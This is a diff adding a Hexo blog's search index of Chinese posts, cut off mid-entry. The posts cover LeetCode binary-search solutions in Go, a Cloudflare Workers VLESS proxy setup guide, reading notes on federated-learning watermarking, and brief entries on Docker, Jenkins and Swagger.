@@ -1,0 +1,765 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>代码练习|数组（移除元素）</title>
+      <link href="/technique/30.html"/>
+      <url>/technique/30.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> leetcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>代码练习|数组（二分查找）</title>
+      <link href="/technique/29.html"/>
+      <url>/technique/29.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704. 二分查找"></a>704. 二分查找</h3><p>leetcode链接：<a href="https://leetcode.cn/problems/binary-search/description/">二分查找</a></p><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。</p><p>示例 1:</p><p>输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 9<br>输出: 4<br>解释: 9 出现在 nums 中并且下标为 4<br>示例 2:</p><p>输入: nums &#x3D; [-1,0,3,5,9,12], target &#x3D; 2<br>输出: -1<br>解释: 2 不存在 nums 中因此返回 -1</p><p>提示：</p><p>你可以假设 nums 中的所有元素是不重复的。<br>n 将在 [1, 10000]之间。<br>nums 的每个元素都将在 [-9999, 9999]之间。</p><p>思路：<br>考虑在闭区间[left, right]查找与target值相同的元素，left初始值为0，right初始值为len(nums) -1，由于left &#x3D; right时区间是有意义的，因此考虑循环条件为left &lt;&#x3D; right。当middle位置元素大于target，则说明目标元素可能在[left, middle-1]，right更新。当middle位置元素小于target，则说明目标元素可能在[middle + 1, right]，当middle位置元素等于target，直接返回middle。循环结束则不存在目标值，返回-1。</p><p>核心代码实现：</p><pre><code>func search(nums []int, target int) int &#123;    left := 0    right := len(nums) - 1    for (left &lt;= right)&#123;        middle := left + ((right - left) / 2)        if(target &lt; nums[middle])&#123;            right = middle - 1            &#125;        if(target &gt; nums[middle])&#123;             left = middle + 1            &#125;        if target == nums[middle]&#123;            return middle        &#125;     &#125;    return -1&#125;</code></pre><h3 id="35-搜索插入位置"><a href="#35-搜索插入位置" class="headerlink" title="35. 搜索插入位置"></a>35. 搜索插入位置</h3><p>leetcode链接：<a href="https://leetcode.cn/problems/search-insert-position/description/">搜索插入位置</a></p><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>请必须使用时间复杂度为 O(log n) 的算法</p><p>示例 1:<br>输入: nums &#x3D; [1,3,5,6], target &#x3D; 5<br>输出: 2</p><p>示例 2:<br>输入: nums &#x3D; [1,3,5,6], target &#x3D; 2<br>输出: 1</p><p>示例 3:<br>输入: nums &#x3D; [1,3,5,6], target &#x3D; 7<br>输出: 4</p><p>提示:</p><p>1 &lt;&#x3D; nums.length &lt;&#x3D; $10^4$<br>$-10^4$ &lt;&#x3D; nums[i] &lt;&#x3D; $10^4$<br>nums 为 无重复元素 的 升序 排列数组<br>$-10^4$ &lt;&#x3D; target &lt;&#x3D; $10^4$</p><p>思路：当遇到排序数组时，就可以考虑二分查找。由题意知“nums为<strong>无重复元素</strong>的<strong>升序</strong>数组”，和704思路类似，考虑在闭区间[left, right]查找与target值相同的元素，但是此时若查找不到目标元素需要将“按顺序插入的位置”返回。针对查找不到目标元素这一情景，因为我们考虑的是闭区间[left, right]，循环条件为left &lt;&#x3D; right，循环结束时，left &gt; right，target值插入位置位于left。</p><p>核心代码实现：</p><pre><code>func searchInsert(nums []int, target int) int &#123;    left := 0    right := len(nums) - 1    middle := 0    for (left &lt;= right)&#123;        middle = left + ((right - left) / 2)         if target &lt; nums[middle]&#123;            right = middle - 1        &#125;        if target &gt; nums[middle]  &#123;            left = middle + 1        &#125;        if nums[middle] == target&#123;            return middle        &#125;    &#125;    return left&#125;</code></pre><h3 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a>34. 在排序数组中查找元素的第一个和最后一个位置</h3><p>leetcode链接：[在排序数组中查找元素的第一个和最后一个位置][3]</p><p>[3]: </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> leetcode </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>docker私有库搭建</title>
+      <link href="/technique/28.html"/>
+      <url>/technique/28.html</url>
+      
+        <content type="html"><![CDATA[<p>本地镜像构建</p><p>推送本地镜像至私有库（需要先配置registry，并让Docker信任当前私有仓库地址）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cloudflare+worker搭建vless高速节点</title>
+      <link href="/technique/27.html"/>
+      <url>/technique/27.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Cloudflare账号</li><li>v2rayN或其他代理软件</li><li>自己的域名（可选，在无优选IP时用）</li></ul><h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><h3 id="worker创建"><a href="#worker创建" class="headerlink" title="worker创建"></a>worker创建</h3><p>登录cloudflare，在Workers and Pages中创建Worker应用程序。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/cloudflare_worker.png" alt="cloudflare worker"></p><p>部署脚本，名称可以随意选取<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker_script.png" alt="worker script"></p><p>部署后，选择刚刚部署的worker，快速编辑脚本，将<a href="https://github.com/zizifn/edgetunnel/blob/main/src/worker-vless.js">该脚本</a>复制，覆盖原hello world脚本。并修改其中的userID和ProxyIP。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-vless.png" alt="worker-vless.js"></p><p>userID就是UUID，UUID生成，有以下方法</p><ul><li><p>按照脚本注释所说</p><p><code>Press &quot;Win + R&quot;, input cmd and run:  Powershell -NoExit -Command &quot;[guid]::NewGuid()&quot;</code></p><p>即在命令行输入对应命令</p></li><li><p>V2rayN生成<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/v2rayN-uuid.png" alt="v2rayN uuid"></p></li><li><p>在线工具生成</p><p><a href="https://1024tools.com/uuid">https://1024tools.com/uuid</a></p><p><a href="https://it.huluohu.com/uuid-generator">https://it.huluohu.com/uuid-generator</a></p></li></ul><p>ProxyIP设置的IP或域名用于中转流量，而不是直接路由到使用Cloudflare的网站。如果没有设置ProxyIP，托管在Cloudflare的一些网站会无法访问。</p><p><a href="https://github.com/3Kmfi6HP">3Kmfi6HP</a>提供的CDN ProxyIP如下：</p><pre><code>cdn-all.xn--b6gac.eu.orgcdn.xn--b6gac.eu.orgcdn-b100.xn--b6gac.eu.orgedgetunnel.anycast.eu.orgcdn.anycast.eu.org</code></pre><p>UUID和ProxyIP设置后，保存并部署。</p><p>查看worker脚本603-626行的代码，vless和clash的节点配置信息如下。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-vless-setting.png" alt="worker-js comment"></p><p>其中hostname是worker设置的反代地址（name+Zone），即路由地址。userID为刚刚设置的UUID。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-host.png" alt="worker-host"></p><p>也可以在浏览器输入：https:&#x2F;&#x2F;你的hostname&#x2F;你的UUID<br>查看赋值后的节点配置信息。（由于workers.dev域名已被墙，因此无法直接访问）</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/worker-vless-info.png" alt="worker setting"></p><h3 id="V2rayN添加节点"><a href="#V2rayN添加节点" class="headerlink" title="V2rayN添加节点"></a>V2rayN添加节点</h3><p>如上文提到的，workers.dev域名已无法直接访问，若也没有自己的域名，则只能使用http传输，无法使用443端口。需要使用<strong>优选ip</strong>进行反向代理。</p><p>以下是优选ip的测试工具，测试后选择一个可行IP即可：</p><pre><code>http://ip.flares.cloud/https://stock.hostmonit.com/CloudFlareYeshttps://vfarid.github.io/cf-ip-scanner/?max=30</code></pre><p>使用优选IP进行反向代理，则此时节点的配置信息需要修改，将服务器地址改为优选IP，端口改为80或2052，不勾选传输层安全TLS（为空）。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/vless-setting.png" alt="vless-seeting"></p><p>若有自己的域名，则可以通过<strong>自定义域名</strong>进行代理。<br>在Cloudflare-websites添加自己的域名</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/cloudflare-website.png" alt="cloudflare website"></p><p>将域名服务器更改为Cloudflare的域名服务器。即将cloudflare提供的域名服务器信息覆盖自己注册域名所在平台DNS管理中的域名服务器信息(以下以阿里云→Cloudflare为例)。域名服务器更换成功，Cloudflare会发送邮件通知。</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/cloudflare-NS.png" alt="cloudflare NS"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/aliyun-DNS.png" alt="aliyun DNS"></p><p>并将原解析记录迁移至Cloudflare（即在Cloudflare添加原域名解析记录）。</p><p>此时，在worker中选择triggers中的自定义域，添加自己的（子）域名，例如vless.example.com，添加成功后，DNS解析记录也会新增一条类型为worker的记录。<br>通过自定义域名，可以使用TLS和443端口。<br>此时节点的配置信息，可以开启传输层安全，服务器地址、tls servername填写自定义域名，端口可以选择443、2083、8443、2087、2053、2096.</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/vless-domain.png" alt="vless custom domain"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.huluohu.com/posts/913/">https://www.huluohu.com/posts/913/</a><br><a href="https://www.thinkhubx.com/network-cf-worker/">https://www.thinkhubx.com/network-cf-worker/</a><br><a href="https://mailberry.com.cn/2023/07/use-cloudflare-workers-to-vless/">https://mailberry.com.cn/2023/07/use-cloudflare-workers-to-vless/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vless </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>论文阅读笔记-When Federated Learning meets Watermarking</title>
+      <link href="/academic/26.html"/>
+      <url>/academic/26.html</url>
+      
+        <content type="html"><![CDATA[<p>论文地址：<a href="https://arxiv.org/abs/2308.03573">arXiv:2308.03573</a><br>摘要：联邦学习是一种允许多个参与者协作训练深度神经网络而无需集中数据的技术。除其他优点外，它具有隐私保护特性，这使得它在敏感环境中的应用具有吸引力，例如医疗保健或军事。虽然数据没有显式交换，但训练过程需要共享有关参与者模型的信息。这使得单个模型容易被恶意行为者盗窃或未经授权的分发。为了解决机器学习背景下的所有权保护问题，深度神经网络水印方法在过去五年中得到了发展。大多数现有的工作集中在水印的方式，但只有少数方法已被设计为联邦学习及其独特的约束。在本文中，我们概述了联邦学习水印的最新进展，阐明了该领域出现的新挑战和机遇。</p><ul><li>机器学习<ul><li>问题<ul><li>敏感信息可能暴露给未经授权的实体</li><li>训练模型的知识产权问题，外部方盗窃、剽窃和未经授权的使用</li></ul></li><li>解决<ul><li>联邦学习允许多个数据所有共同训练全局模型，无需直接共享他们的私有数据</li><li>模型水印嵌入模型中，在非法模型泄露的情况下能够追踪来源<ul><li>大多数仅解决局部&#x2F;集中训练的问题<ul><li>如何识别参与方对联邦学习做出了贡献</li><li>如何确保最终模型不会被聚合方滥用</li></ul></li></ul></li></ul></li></ul></li><li>联邦学习<ul><li>框架<ul><li>中心-服务器</li><li>无中心服务器，对等（随机选择客户端作为聚合器）</li><li>Split-Learning<ul><li>在服务器和客户端之间分裂模型，常见的是U型配置：每个客户端有第一层和最后一层，服务器有剩余的层</li></ul></li></ul></li><li>目的<ul><li>确保客户端数据的安全性和隐私性，同时实现与集中式训练相当的模型性能</li></ul></li><li>威胁<ul><li>假设服务器是诚实但好奇的，它将遵循关于客户端选择和全局模型聚合&#x2F;分发的协议，但尝试推断关于客户端数据的信息<ul><li>反转攻击<ul><li>从参与方共享的梯度中重建用户学习的数据</li><li>防御方法<ul><li>同态加密<ul><li>缺点<ul><li>高计算和通信复杂度</li><li>只允许对加密数据执行线性运算，限制了聚合的范围</li></ul></li></ul></li><li>差分隐私<ul><li>缺点<ul><li>难以平衡隐私与模型性能</li></ul></li></ul></li><li>可信执行环境<ul><li>缺点</li><li><ul><li>资源消耗</li></ul></li></ul></li><li>安全多方计算<ul><li>缺点<ul><li>效率低</li></ul></li></ul></li></ul></li></ul></li></ul></li><li>假设客户端是恶意的，引入恶意数据破坏模型的训练，导致模型错误地将特定模式地数据分类，同时保持其在主要任务上的性能<ul><li>中毒攻击（后门攻击）</li><li>具有鲁棒性的聚合方法<ul><li>中值聚合</li><li>Krum聚合</li><li>修剪均值聚合</li></ul></li><li>异常检测<ul><li>执行模型聚合前过滤掉异常的客户端更新</li></ul></li></ul></li></ul></li><li>安全FL环境的建立过程<ul><li>对参与联邦学习的实体进行安全性分析，并评估他们的可信程度</li><li>集成安全方法，确保数据和模型的隐私</li></ul></li></ul></li><li>DNN水印<ul><li>水印需求<ul><li>机密性<ul><li>任何分析模型的人无法检测到模型是否带有水印</li></ul></li><li>保真度<ul><li>保持模型在主要任务上的性能</li></ul></li><li>可靠性<ul><li>确保模型所有者在IP验证期间的低误报率</li></ul></li><li>完整性<ul><li>防止其他方的误报</li></ul></li><li>通用性<ul><li>水印算法应该独立于模型</li></ul></li><li>鲁棒性<ul><li>从被攻击的模型中重构出正确水印的可能性</li></ul></li><li>容量<ul><li>嵌入多个水印的能力</li></ul></li><li>效率<ul><li>水印嵌入和验证过程产生的性能成本</li></ul></li><li>子主题</li></ul></li><li>攻击<ul><li>修剪攻击（Pruning Attack）<ul><li>将冗余的模型权重归零，也可以移除冗余的神经元、滤波器或层来修剪模型。</li></ul></li><li>微调（Fine Tuning Attack）<ul><li>重新训练模型并更新其权重，而不降低精度。</li></ul></li><li>覆盖攻击（Overwriting Attack）<ul><li>嵌入一个新的水印来替换原来的水印</li></ul></li><li>Wang and Kerschbaum Attack<ul><li>针对静态白盒水印算法，依赖视觉检查来改变水印模型的权重分布</li></ul></li><li>属性推断攻击（Property Inference Attack）<ul><li>训练辨别模型以区分带水印模型和不带水印的模型</li></ul></li><li>模糊攻击（Ambiguity Attack）<ul><li>在模型上伪造一个新的水印，使外部实体难以确定合法的水印所有者</li></ul></li></ul></li><li>验证过程访问模型参数的类型<ul><li>白盒<ul><li>完全访问模型（架构、参数、激活映射）</li><li>方法<ul><li>以二进制字符串或图像的形式，将信息隐藏至模型参数</li><li>激活映射</li><li>添加护照层（passport layer）</li></ul></li><li>典型方案<ul><li>目标模型M，加水印版本Mwat，秘密密钥Kext，特征提取函数Ext，投影函数Proj，秘密密钥Kproj，水印b，从水印模型Mwat提取的水印bext</li><li>提取模型特征，利用这些特征进行水印插入&#x2F;提取<ul><li>所获得的特征可以是模型权重的子集、从触发集中秘密选择的特定输入数据的模型激活图</li><li>使用特定正则化项Ewat正则化M<ul><li>依赖在水印空间定义的距离度量d，距离度量可以是汉明距离、铰链距离或者交叉熵</li><li>确保投影函数在预定的水印空间对水印进行编码</li></ul></li><li>通过损失函数参数化的微调操作导出带水印模型</li></ul></li><li>例子<ul><li>方案1<ul><li>特征提取函数涉及计算秘密选择的滤波器权重w的平均值</li><li>使用二进制交叉熵作为水印正则化项Ewat的距离度量d</li></ul></li><li>方案2<ul><li>特征提取函数由批量归一化权重中的缩放参数组成</li><li>铰链损失被用作水印正则化Ewat的距离度量d</li></ul></li></ul></li></ul></li></ul></li><li>黑盒<ul><li>通过提供输入和接收相关预测与模型交互，只能通过API执行验证过程</li><li>方法<ul><li>通过改变模型的行为对其添加水印</li><li>常用技术包括<ul><li>使用触发集训练模型</li></ul></li><li>每一个epoch训练期间，一个batch不是仅来自训练集，而是训练集和触发集之间的串联</li></ul></li><li>例子<ul><li>不同类型的输入<ul><li>内容水印：将有意义的内容添加到训练集的图像中。模型应该由内容触发，并返回相关的固定标签。</li><li>不相关水印：与模型的主要任务无关的图像。每个图像都有一个相关的标签，或者每个样本都可以有其特定的输出。</li><li>噪声水印：为训练集中的图像添加特定的噪声。然后，该模型将具有该特定噪声的任何图像分类为预定义的标签。</li></ul></li></ul></li></ul></li></ul></li></ul></li><li>联邦学习模型水印<ul><li>问题<ul><li>存在多个参与者</li><li>需要考虑参与方交换期间的威胁</li><li>在训练完成后对模型进行水印处理，或是开始训练之前嵌入水印，存在模型被窃取以及水印剔除的风险</li></ul></li><li>定义<ul><li>一个或多个参与者将水印插入共享模型的过程，遵循客户端-服务器框架</li><li>服务器<ul><li>负责给全局模型加水印</li></ul></li><li>客户端<ul><li>一个或多个客户端对模型更新添加水印，以便为全局模型添加水印</li></ul></li><li>服务器和客户端<ul><li>服务器和客户端协作，共同为全局模型添加水印</li></ul></li><li>水印需求<ul><li>容量<ul><li>避免插入不同客户端信息的冲突，需要足够的比特数</li></ul></li><li>通用性<ul><li>FL有许多额外的安全和隐私机制（如鲁棒聚合和差分隐私），水印需要独立地应用这些机制</li></ul></li><li>效率<ul><li>跨设备架构中，客户端的计算能力较低，需要考虑嵌入水印过程产生的成本</li></ul></li><li>保密性<ul><li>所有参与方未参与注册水印过程，应当没有水印被检测出</li></ul></li><li>鲁棒性<ul><li>每个参与者需要有唯一的一个水印，能够标识所有者</li></ul></li></ul></li></ul></li><li>相关工作<ul><li>WAFFLE<ul><li>B,G, Tekgul,et al.“Waffle: Watermarking in federated learning“，SRDS.2021</li><li>假设<ul><li>服务器是一个可信方，使用黑盒水印技术。利用触发集嵌入模型水印</li><li>客户端不能够使用后门、投毒或是嵌入自己的水印<ul><li>被激励最大限度提高全局模型准确率</li></ul></li><li>对手只能保存模型和应用模型</li><li>可以使用不需要客户端数据的触发集，WAFFLEPattern：一组包含随机图案的图像，背景有噪声<ul><li>WAFFLEPATTERN更好地保留了模型性能，并降低了通信和计算开销</li><li>弹性的水印去除技术，包括微调，修剪和逆向工程，如果不超过10%的客户端串通击败水印程序。</li></ul></li></ul></li><li>黑盒水印<ul><li>预训练<ul><li>使用触发集训练初始化的模型，直到该模型在该集合上具有良好的准确率</li></ul></li><li>再训练<ul><li>使用触发集微调模型，直到模型学习了水印</li></ul></li><li>PreTrain用于在第一轮之前将水印嵌入到模型中。在每一轮中，在聚合过程之后，服务器使用ReTrain将水印重新嵌入到模型中。</li></ul></li></ul></li><li>FedIPR<ul><li>Li B,et al. “FedIPR: Ownership verification for federated deep neural network models”, TPAMI, 2022</li><li>既有白盒水印也有黑盒水印<ul><li>白盒水印<ul><li>每个客户端生成一个随机秘密矩阵以及一个批量归一化层的位置，嵌入消息</li><li>损失：原始消息和重建消息之间的类似铰链的损失</li></ul></li><li>黑盒水印<ul><li>每个客户端在本地数据训练的小型CNN中使用投影梯度下降技术生成触发集</li><li>损失：和主任务的损失相同，但使用触发集作为输入</li></ul></li></ul></li></ul></li><li>FedTracker<ul><li>Shao S, et al. “Fedtracker:Furnishing ownership verification and traceability for federated learning model”, arxiv, 2022</li><li>假设<ul><li>服务器是一个可信方，不能访问与原始任务相关的数据</li><li>客户端可能是恶意的，也可能是诚实的。恶意客户端可以复制和分发模型，但需要遵循训练过程以最大限度提高全局准确率</li></ul></li><li>允许服务器嵌入全局黑盒水印，也可以嵌入特定于每个客户端的白盒水印<ul><li>全局黑盒水印<ul><li>使用WAFFLEPattern方法生成触发集</li><li>聚合之后嵌入</li></ul></li><li>白盒水印<ul><li>服务器为每个客户端生成一个随机秘密矩阵和指纹</li><li>损失：原始消息和重构消息之间类似铰链的损失</li></ul></li></ul></li></ul></li><li>Liu<ul><li>Liu X, et al.“Secure federated learing model verification: A client-side backdoor triggered watermarking scheme”,SMC,2021</li><li>客户端黑盒水印方案<ul><li>假设<ul><li>服务器是不可信的</li><li>客户端也可能是恶意的</li><li>验证过程中，一个完全值得信赖的第三方被招募为仲裁者</li><li>引入比例因子避免特定客户端在每一轮被选中<ul><li>客户端发送其乘以λ的模型权重<ul><li>近似于每次迭代都选择该客户端，并且水印更容易嵌入</li></ul></li></ul></li></ul></li><li>触发集<ul><li>由发起者创建具有给定标签的高斯噪声图像组成的触发集</li></ul></li></ul></li></ul></li><li>FedRight<ul><li>Chen J, et al. “Fedright: An effective model copyright protection for federated learning”, Computers &amp; Security, 2023</li><li>模型指纹（白盒）<ul><li>假设<ul><li>服务器是可信且诚实的</li><li>客户端可能不可信</li></ul></li><li>方法<ul><li>服务器从一组输入（关键样本）中生成对抗性示例</li><li>服务器提取每个预测的概率分布，并将其反馈至具有关键样本目标的检测器</li><li>验证过程中，由检测器预测对应的模型是否是好的</li></ul></li></ul></li></ul></li><li>FedCIP<ul><li>Liang J, Wang R.“FedCIP: Federated Client Intellectual Property Protection with Traitor Tracking”, arxiv, 2023</li><li>白盒水印方案<ul><li>假设<ul><li>服务器是诚实但好奇的，不能直接修改模型的参数</li><li>客户端可能是恶意的，可以发起模型窃取行为</li><li>触发集不依赖于原始数据</li></ul></li><li>方法<ul><li>对于每个客户端，水印在一个周期期间是唯一的<ul><li>如果该轮是循环的第一次迭代，则用新的水印替换先前的水印</li><li>否则进行小的更新增强水印</li></ul></li><li>Federated watermark进行水印验证<ul><li>给定周期的所有贡献者的水印的级联</li><li>如客户端泄露模型，可以通过计算具有高水印检测率的参与者与泄露模型的交集来识别</li></ul></li></ul></li></ul></li></ul></li><li>Yang<ul><li>Yang W, et al.“Watermarking in Secure FederatedLearming: A Verification Framework Based on Client-Side Backdooring”, arxiv,2022</li><li>黑盒水印方案<ul><li>方法<ul><li>使用基于置换的密钥和基于噪声的模式构建图像<ul><li>可以抵抗歧义攻击，无论是试图暴力破解密钥还是生成新的触发集</li></ul></li></ul></li></ul></li></ul></li><li>Merkle Sign<ul><li>Li F Q, et al, “Towards practical watermark for deep neural networks in federated learning”, arxiv, 2021</li><li>Li F Q, et al.“Merkle-Sign: Watermarking Framework for Deep Neural Networks in Federated Learning”, arxiv, 2021</li><li>假设<ul><li>服务器是可信的</li><li>客户端是诚实但好奇的</li></ul></li><li>使用Merkle树的公共验证协议&amp;#x20;<ul><li>服务器在每一轮使用嵌入函数将两条身份信息（密钥）插入全局模型中，一条标识服务器，另一条标识接收模型的客户端</li><li>服务器上传密钥元组和由水印嵌入函数生成的验证函数元组，转化为具有事件记录的merkle树</li><li>最后一轮，服务器将客户端生成的所有密钥嵌入全局模型并更新merkle树</li></ul></li><li>黑盒水印方案<ul><li>依赖于每个客户端的自动编码器</li></ul></li><li>白盒水印</li><li>防御<ul><li>歧义攻击<ul><li>使用授权的时间服务器或分散的共识协议进行授权</li></ul></li><li>破坏攻击<ul><li>应用多个水印</li></ul></li><li>叛徒跟踪<ul><li>为每个客户端嵌入唯一的水印</li></ul></li></ul></li><li>缺点<ul><li>缺少训练终止后识别叛徒客户端的协议，因为模型的水印同时来自所有客户端的信息</li></ul></li></ul></li><li>FedZKP<ul><li>Yang W, et al.“FedZKP: Federated Model Ownership Verification with Zero-knowledge Proof, arxiv, 2023</li><li>假设<ul><li>客户端是可信的</li><li>服务器是诚实但好奇的</li></ul></li><li>基于零知识证明的验证协议<ul><li>用户需要与可信机构共享其公钥验证模型所有权<ul><li>存在拦截密钥的攻击者</li><li>使用零知识证明协议解决，确保只有拥有水印中公钥相关联的私钥的个人才能证明</li></ul></li></ul></li><li>白盒水印<ul><li>每个客户端配备公钥和私钥</li><li>客户端公钥的散列嵌入到模型中</li></ul></li></ul></li><li>子主题</li></ul></li><li>讨论<ul><li>基于触发集的服务器端水印算法<ul><li>大多数方法通过在损失函数中添加正则化项，让模型在触发集上过拟合</li><li>大多数黑盒水印算法基于主任务数据集构建触发集</li><li>服务器没有自己的数据集，因此需要使用不相关或者基于噪声的输入（例如WafflePattern），或是从客户端提供的自动编码器生成触发集（例如Merkle Sign）<ul><li>分别学习两项任务可能会对Fedelity产生负面影响<ul><li>FedTracker使用持续学习和全局梯度记忆来防止先前学习的干扰</li></ul></li><li>容易遭到Evasion attack</li></ul></li></ul></li><li>聚合函数<ul><li>常见的聚合函数<ul><li>FedAvg<ul><li>在客户端执行多个epoch后，参数的平均</li><li>每个客户端的权重矩阵乘以一个缩放因子<ul><li>子主题<ul><li>n为所有客户端数据集样本的数量</li></ul></li><li>子主题</li></ul></li></ul></li></ul></li><li>水印方法应该独立于聚合函数</li><li>由于客户端的水印技术对嵌入消息和触发集敏感，因此他们保持远离彼此的更新<ul><li>所使用安全聚合技术，一部分的更新可能会因此被拒绝</li></ul></li><li>数据异构的情况，目前缺乏相关工作解决</li></ul></li><li>客户端选择<ul><li>考虑不同端嵌入水印时客户端选择的影响</li></ul></li><li>跨设备设置<ul><li>大部分方法处理的是少量客户端的情况</li><li>黑盒水印，该问题来自低计算能力</li><li>白盒水印，该问题来自嵌入容量</li></ul></li><li>差分隐私和同态加密<ul><li>差分隐私<ul><li>服务器和客户端之间（或直接在客户端之间）共享模型或梯度更新，存在对潜在攻击的担忧，例如成员推断</li><li>常见DP方法<ul><li>将高斯随机噪声引入到发送到聚合器的梯度中，从而添加额外的隐私保护层</li></ul></li></ul></li><li>同态加密<ul><li>客户端可以使用其公钥保护其模型更新，在将数据发送到服务器之前对其进行加密。服务器在加密空间中执行模型聚合，客户端可以在收到聚合的全局模型后使用其私钥对其进行解密。</li><li>适合S1场景（客户端添加水印），不适用于S1（服务器端嵌入水印）</li></ul></li></ul></li><li>非CS架构的联邦学习水印<ul><li>U型架构服务器端执行黑盒水印较为困难，其无法在模型上使用输入和标签</li></ul></li><li>来自客户端和服务器的攻击<ul><li>服务器可以控制所选择的参与者或如何聚合模型参数。它有时也清楚地了解客户在每一轮的参数。然而，它没有数据，也无法完全控制客户是否严格遵守培训程序。</li><li>客户端有自己的私有数据集，他们可以发送他们想要的更新。然而，他们无法控制服务器级别的更新。如果服务器想要避免客户端的子集对模型进行水印，它可以使用拜占庭攻击检测方法。</li></ul></li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> academic </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> paper </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《Deep Learning for Computer vision》-01</title>
+      <link href="/knowledge/25.html"/>
+      <url>/knowledge/25.html</url>
+      
+        <content type="html"><![CDATA[<p>《Deep Learning for Computer Vision》是密歇根大学开设的计算机视觉课程，课程涵盖算法、神经网络架构、视觉识别任务中网络训练和微调的工程实际技巧的培训。</p><p>课程资源</p><ul><li>课程网站：<a href="https://web.eecs.umich.edu/~justincj/teaching/eecs498/WI2022/">1</a></li><li>课程教材：<a href="https://www.deeplearningbook.org/">2</a></li><li>课程视频：<a href="https://www.youtube.com/watch?v=YnQJTfbwBM8&list=PL5-TkQAfAZFbzxjBHtzdVCWE0Zbhomg7r">3</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> knowledge </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cv </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-Jenkins篇</title>
+      <link href="/technique/23.html"/>
+      <url>/technique/23.html</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://www.jenkins.io/doc/">Jenkins官方英文文档</a><br><a href="https://www.jenkins.io/zh/doc/">Jenkins官方中文文档</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Jenkins </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-swagger篇</title>
+      <link href="/technique/22.html"/>
+      <url>/technique/22.html</url>
+      
+        <content type="html"><![CDATA[<h3 id="OpenAPI规范"><a href="#OpenAPI规范" class="headerlink" title="OpenAPI规范"></a>OpenAPI规范</h3><p><a href="https://openapi.apifox.cn/">OpenAPI 规范</a>（OpenAPI Specification），是定义一个标准的、与具体编程语言无关的RESTful API的规范。OpenAPI 规范可以在“不接触任何程序源代码和文档、不监控网络通信”的情况下理解一个服务的作用。遵循 OpenAPI 规范来定义 API，以使用文档生成工具来展示。主要的Swagger工具包括：</p><ul><li>Swagger Editor：基于浏览器的编辑器，可以在其中编写 OpenAPI 定义。</li><li>Swagger UI：将 OpenAPI 定义渲染为交互式文档。</li><li>Swagger Codegen：根据 OpenAPI 定义生成服务器存根和客户端库。</li><li>Swagger Editor Next (beta)：基于浏览器的编辑器，可以在其中编写和审查 OpenAPI 和 AsyncAPI 定义。</li><li>Swagger Core：用于创建、使用和处理 OpenAPI 定义的 Java 相关库。</li><li>Swagger Parser：用于解析 OpenAPI 定义的独立库</li><li>Swagger APIDom：为描述各种描述语言和序列化格式的 API 提供单一、统一的结构。</li></ul><h3 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h3><p><a href="https://swagger.io/">Swagger</a> 是一套围绕 